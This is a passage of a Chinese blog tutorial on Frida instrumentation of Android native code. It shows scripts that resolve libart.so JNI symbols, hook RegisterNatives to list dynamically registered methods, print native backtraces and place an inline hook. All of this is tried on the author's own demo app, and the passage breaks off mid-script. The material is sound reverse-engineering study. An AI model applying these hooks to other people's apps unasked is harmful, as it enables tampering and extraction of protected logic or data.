</span>&#123;</span><br><span class="line">    JNIEnv *env;</span><br><span class="line">    vm-&gt;GetEnv((<span class="keyword">void</span> **) &amp;env, JNI_VERSION_1_6);</span><br><span class="line">    JNINativeMethod methods[] = &#123;</span><br><span class="line">            &#123;<span class="string">"stringFromJNI2"</span>, <span class="string">"()Ljava/lang/String;"</span>, (<span class="keyword">void</span> *) stringFromJNI2&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    env-&gt;RegisterNatives(env-&gt;FindClass(<span class="string">"myapplication/example/com/ndk_demo/MainActivity"</span>), methods,</span><br><span class="line">                         <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-RegisterNative"><a href="#Frida-hook-RegisterNative" class="headerlink" title="Frida hook RegisterNative"></a>Frida hook RegisterNative</h3><p>使用下面这个脚本来打印出RegisterNatives的参数，这里需要注意的是使用了enumerateSymbolsSync,它是enumerateSymbols的同步版本。<br>另外和我们之前通过<code>Java.vm.tryGetEnv().getStringUtfChars</code>来调用env里的方法不同。<br>这里则是通过将之前找到的getStringUtfChars函数地址和参数信息封装起来，直接调用，具体的原理我没有深入分析，先记住用法。<br>原理其实是一样的，都是<strong>根据符号找到地址，然后hook符号地址，然后打印参数</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">declare <span class="keyword">const</span> NativeFunction: NativeFunctionConstructor;</span><br><span class="line"></span><br><span class="line">interface NativeFunctionConstructor &#123;</span><br><span class="line">    <span class="keyword">new</span>(address: NativePointerValue, <span class="attr">retType</span>: NativeType, <span class="attr">argTypes</span>: NativeType[], abiOrOptions?: NativeABI | NativeFunctionOptions): NativeFunction;</span><br><span class="line">    readonly prototype: NativeFunction;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">var</span> funcGetStringUTFChars = <span class="keyword">new</span> NativeFunction(addrGetStringUTFChars, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ishook_libart = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_libart</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ishook_libart === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> symbols = Module.enumerateSymbolsSync(<span class="string">"libart.so"</span>);</span><br><span class="line">    <span class="keyword">var</span> addrGetStringUTFChars = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrNewStringUTF = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrFindClass = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrGetMethodID = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrGetStaticMethodID = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrGetFieldID = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrGetStaticFieldID = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrRegisterNatives = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrAllocObject = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrCallObjectMethod = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrGetObjectClass = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrReleaseStringUTFChars = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i];</span><br><span class="line">        <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI17GetStringUTFCharsEP7_JNIEnvP8_jstringPh"</span>) &#123;</span><br><span class="line">            addrGetStringUTFChars = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetStringUTFChars is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI12NewStringUTFEP7_JNIEnvPKc"</span>) &#123;</span><br><span class="line">            addrNewStringUTF = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"NewStringUTF is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI9FindClassEP7_JNIEnvPKc"</span>) &#123;</span><br><span class="line">            addrFindClass = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"FindClass is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI11GetMethodIDEP7_JNIEnvP7_jclassPKcS6_"</span>) &#123;</span><br><span class="line">            addrGetMethodID = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetMethodID is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI17GetStaticMethodIDEP7_JNIEnvP7_jclassPKcS6_"</span>) &#123;</span><br><span class="line">            addrGetStaticMethodID = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetStaticMethodID is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI10GetFieldIDEP7_JNIEnvP7_jclassPKcS6_"</span>) &#123;</span><br><span class="line">            addrGetFieldID = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetFieldID is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI16GetStaticFieldIDEP7_JNIEnvP7_jclassPKcS6_"</span>) &#123;</span><br><span class="line">            addrGetStaticFieldID = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetStaticFieldID is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI15RegisterNativesEP7_JNIEnvP7_jclassPK15JNINativeMethodi"</span>) &#123;</span><br><span class="line">            addrRegisterNatives = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"RegisterNatives is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">"_ZN3art3JNI11AllocObjectEP7_JNIEnvP7_jclass"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            addrAllocObject = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"AllocObject is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125;  <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">"_ZN3art3JNI16CallObjectMethodEP7_JNIEnvP8_jobjectP10_jmethodIDz"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            addrCallObjectMethod = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"CallObjectMethod is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">"_ZN3art3JNI14GetObjectClassEP7_JNIEnvP8_jobject"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            addrGetObjectClass = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetObjectClass is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">"_ZN3art3JNI21ReleaseStringUTFCharsEP7_JNIEnvP8_jstringPKc"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            addrReleaseStringUTFChars = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"ReleaseStringUTFChars is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addrRegisterNatives != <span class="literal">null</span>) &#123;</span><br><span class="line">        Interceptor.attach(addrRegisterNatives, &#123;</span><br><span class="line">            onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"[RegisterNatives] method_count:"</span>, args[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">var</span> env = args[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">var</span> java_class = args[<span class="number">1</span>];</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">var</span> funcAllocObject = <span class="keyword">new</span> NativeFunction(addrAllocObject, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line">                <span class="keyword">var</span> funcGetMethodID = <span class="keyword">new</span> NativeFunction(addrGetMethodID, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line">                <span class="keyword">var</span> funcCallObjectMethod = <span class="keyword">new</span> NativeFunction(addrCallObjectMethod, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line">                <span class="keyword">var</span> funcGetObjectClass = <span class="keyword">new</span> NativeFunction(addrGetObjectClass, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line">                <span class="keyword">var</span> funcGetStringUTFChars = <span class="keyword">new</span> NativeFunction(addrGetStringUTFChars, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line">                <span class="keyword">var</span> funcReleaseStringUTFChars = <span class="keyword">new</span> NativeFunction(addrReleaseStringUTFChars, <span class="string">"void"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> clz_obj = funcAllocObject(env, java_class);</span><br><span class="line">                <span class="keyword">var</span> mid_getClass = funcGetMethodID(env, java_class, Memory.allocUtf8String(<span class="string">"getClass"</span>), Memory.allocUtf8String(<span class="string">"()Ljava/lang/Class;"</span>));</span><br><span class="line">                <span class="keyword">var</span> clz_obj2 = funcCallObjectMethod(env, clz_obj, mid_getClass);</span><br><span class="line">                <span class="keyword">var</span> cls = funcGetObjectClass(env, clz_obj2);</span><br><span class="line">                <span class="keyword">var</span> mid_getName = funcGetMethodID(env, cls, Memory.allocUtf8String(<span class="string">"getName"</span>), Memory.allocUtf8String(<span class="string">"()Ljava/lang/String;"</span>));</span><br><span class="line">                <span class="keyword">var</span> name_jstring = funcCallObjectMethod(env, clz_obj2, mid_getName);</span><br><span class="line">                <span class="keyword">var</span> name_pchar = funcGetStringUTFChars(env, name_jstring, ptr(<span class="number">0</span>));</span><br><span class="line">                <span class="keyword">var</span> class_name = ptr(name_pchar).readCString();</span><br><span class="line">                funcReleaseStringUTFChars(env, name_jstring, name_pchar);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//console.log(class_name);</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> methods_ptr = ptr(args[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> method_count = <span class="built_in">parseInt</span>(args[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; method_count; i++) &#123;</span><br><span class="line">                    <span class="keyword">var</span> name_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * <span class="number">3</span>));</span><br><span class="line">                    <span class="keyword">var</span> sig_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * <span class="number">3</span> + Process.pointerSize));</span><br><span class="line">                    <span class="keyword">var</span> fnPtr_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * <span class="number">3</span> + Process.pointerSize * <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> name = Memory.readCString(name_ptr);</span><br><span class="line">                    <span class="keyword">var</span> sig = Memory.readCString(sig_ptr);</span><br><span class="line">                    <span class="keyword">var</span> find_module = Process.findModuleByAddress(fnPtr_ptr);</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"[RegisterNatives] java_class:"</span>, class_name, <span class="string">"name:"</span>, name, <span class="string">"sig:"</span>, sig, <span class="string">"fnPtr:"</span>, fnPtr_ptr, <span class="string">"module_name:"</span>, find_module.name, <span class="string">"module_base:"</span>, find_module.base, <span class="string">"offset:"</span>, ptr(fnPtr_ptr).sub(find_module.base));</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123; &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ishook_libart = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hook_libart();</span><br></pre></td></tr></table></figure><p>结果很明显的打印了出来，包括动态注册的函数的名字，函数签名，加载地址和在so里的偏移量，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[RegisterNatives] java_class: myapplication.example.com.ndk_demo.MainActivity name: stringFromJNI2 sig: ()Ljava&#x2F;lang&#x2F;String; fnPtr: 0x79f8698484 module_name: libnative-lib.so module_base: 0x79f8691000 offset: 0x7484</span><br></pre></td></tr></table></figure><p>最后测试一下yang开源的一个hook art的脚本，很有意思，trace出了非常多的需要的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frida -U --no-pause -f package_name -l hook_art.js</span><br><span class="line">...</span><br><span class="line">[FindClass] name:myapplication&#x2F;example&#x2F;com&#x2F;ndk_demo&#x2F;Test</span><br><span class="line">[GetStaticFieldID] name:publicStaticField, sig:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">[GetStringUTFChars] result:i am a publicStaticField</span><br><span class="line">[NewStringUTF] bytes:Hello from C++ stringFromJNI2</span><br><span class="line">[GetStringUTFChars] result:sakura</span><br></pre></td></tr></table></figure><h3 id="native层调用栈打印"><a href="#native层调用栈打印" class="headerlink" title="native层调用栈打印"></a>native层调用栈打印</h3><p>直接使用frida提供的接口打印栈回溯。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Interceptor.attach(f, &#123;</span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'RegisterNatives called from:\n'</span> +</span><br><span class="line">        Thread.backtrace(<span class="keyword">this</span>.context, Backtracer.ACCURATE)</span><br><span class="line">        .map(DebugSymbol.fromAddress).join(<span class="string">'\n'</span>) + <span class="string">'\n'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>效果如下,我加到了hook registerNative的地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Google Pixel::myapplication.example.com.ndk_demo]-&gt; RegisterNatives called from:</span><br><span class="line">0x7a100be03c libart.so!0xe103c</span><br><span class="line">0x7a100be038 libart.so!0xe1038</span><br><span class="line">0x79f85699a0 libnative-lib.so!_ZN7_JNIEnv15RegisterNativesEP7_jclassPK15JNINativeMethodi+0x44</span><br><span class="line">0x79f85698e0 libnative-lib.so!JNI_OnLoad+0x90</span><br><span class="line">0x7a102b9fd4 libart.so!_ZN3art9JavaVMExt17LoadNativeLibraryEP7_JNIEnvRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEP8_jobjectP8_jstringPS9_+0x638</span><br><span class="line">0x7a08e3820c libopenjdkjvm.so!JVM_NativeLoad+0x110</span><br><span class="line">0x70b921c4 boot.oat!oatexec+0xa81c4</span><br></pre></td></tr></table></figure><h3 id="主动调用去进行方法参数替换"><a href="#主动调用去进行方法参数替换" class="headerlink" title="主动调用去进行方法参数替换"></a>主动调用去进行方法参数替换</h3><p>使用<code>Interceptor.replace</code>，不赘述。主要目的还是为了改掉函数原本的执行行为，而不是仅仅打印一些信息。</p><h3 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h3><p>inline hook简单理解就是不是hook函数开始执行的地方，而是hook函数中间执行的指令<br>整体来说没什么区别，就是把找函数符号地址改成从so里找到偏移，然后加到so基地址上就行,注意一下它的attach的callback。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Callback to invoke when an instruction is about to be executed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">type InstructionProbeCallback = <span class="function">(<span class="params"><span class="keyword">this</span>: InvocationContext, args: InvocationArguments</span>) =&gt;</span> <span class="keyword">void</span>;</span><br><span class="line">type InvocationContext = PortableInvocationContext | WindowsInvocationContext | UnixInvocationContext;</span><br><span class="line"></span><br><span class="line">interface PortableInvocationContext &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return address.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    returnAddress: NativePointer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * CPU registers. You may also update register values by assigning to these keys.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    context: CpuContext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * OS thread ID.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    threadId: ThreadId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Call depth of relative to other invocations.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    depth: number;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * User-defined invocation data. Useful if you want to read an argument in `onEnter` and act on it in `onLeave`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    [x: string]: any;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">interface Arm64CpuContext extends PortableCpuContext &#123;</span><br><span class="line">    x0: NativePointer;</span><br><span class="line">    x1: NativePointer;</span><br><span class="line">    x2: NativePointer;</span><br><span class="line">    x3: NativePointer;</span><br><span class="line">    x4: NativePointer;</span><br><span class="line">    x5: NativePointer;</span><br><span class="line">    x6: NativePointer;</span><br><span class="line">    x7: NativePointer;</span><br><span class="line">    x8: NativePointer;</span><br><span class="line">    x9: NativePointer;</span><br><span class="line">    x10: NativePointer;</span><br><span class="line">    x11: NativePointer;</span><br><span class="line">    x12: NativePointer;</span><br><span class="line">    x13: NativePointer;</span><br><span class="line">    x14: NativePointer;</span><br><span class="line">    x15: NativePointer;</span><br><span class="line">    x16: NativePointer;</span><br><span class="line">    x17: NativePointer;</span><br><span class="line">    x18: NativePointer;</span><br><span class="line">    x19: NativePointer;</span><br><span class="line">    x20: NativePointer;</span><br><span class="line">    x21: NativePointer;</span><br><span class="line">    x22: NativePointer;</span><br><span class="line">    x23: NativePointer;</span><br><span class="line">    x24: NativePointer;</span><br><span class="line">    x25: NativePointer;</span><br><span class="line">    x26: NativePointer;</span><br><span class="line">    x27: NativePointer;</span><br><span class="line">    x28: NativePointer;</span><br><span class="line"></span><br><span class="line">    fp: NativePointer;</span><br><span class="line">    lr: NativePointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我的so是自己编译的，具体的汇编代码如下,总之这里很明显在775C时，x0里保存的是一个指向”sakura”这个字符串的指针。(其实我也不是很看得懂arm64了已经，就随便hook了一下)<br>所以hook这个指令，然后<code>Memory.readCString(this.context.x0);</code>打印出来，结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000772</span>C ; __unwind &#123;</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000772</span>C                 SUB             SP, SP, #<span class="number">0x40</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007730</span>                 STP             X29, X30, [SP,#<span class="number">0x30</span>+var_s0]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007734</span>                 ADD             X29, SP, #<span class="number">0x30</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007738</span> ; <span class="number">6</span>:   v6 = a1;</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007738</span>                 MOV             X8, XZR</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000773</span>C                 STUR            X0, [X29,#var_8]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007740</span> ; <span class="number">7</span>:   v5 = a3;</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007740</span>                 STUR            X1, [X29,#var_10]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007744</span>                 STR             X2, [SP,#<span class="number">0x30</span>+var_18]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007748</span> ; <span class="number">8</span>:   v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)_JNIEnv::GetStringUTFChars(a1, a3, <span class="number">0L</span>L);</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007748</span>                 LDUR            X0, [X29,#var_8]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000774</span>C                 LDR             X1, [SP,#<span class="number">0x30</span>+var_18]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007750</span>                 MOV             X2, X8</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007754</span>                 BL              ._ZN7_JNIEnv17GetStringUTFCharsEP8_jstringPh ; _JNIEnv::GetStringUTFChars(_jstring *,uchar *)</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007758</span>                 STR             X0, [SP,#<span class="number">0x30</span>+var_20]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000775</span>C ; <span class="number">9</span>:   <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)_JNIEnv::GetStringUTFLength(v6, v5) &gt; <span class="number">0</span> )</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000775</span>C                 LDUR            X0, [X29,#var_8]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007760</span>                 LDR             X1, [SP,#<span class="number">0x30</span>+var_18]</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inline_hook</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libnative_lib_addr = Module.findBaseAddress(<span class="string">"libnative-lib.so"</span>);</span><br><span class="line">    <span class="keyword">if</span> (libnative_lib_addr) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"libnative_lib_addr:"</span>, libnative_lib_addr);</span><br><span class="line">        <span class="keyword">var</span> addr_775C = libnative_lib_addr.add(<span class="number">0x775C</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"addr_775C:"</span>, addr_775C);</span><br><span class="line"></span><br><span class="line">        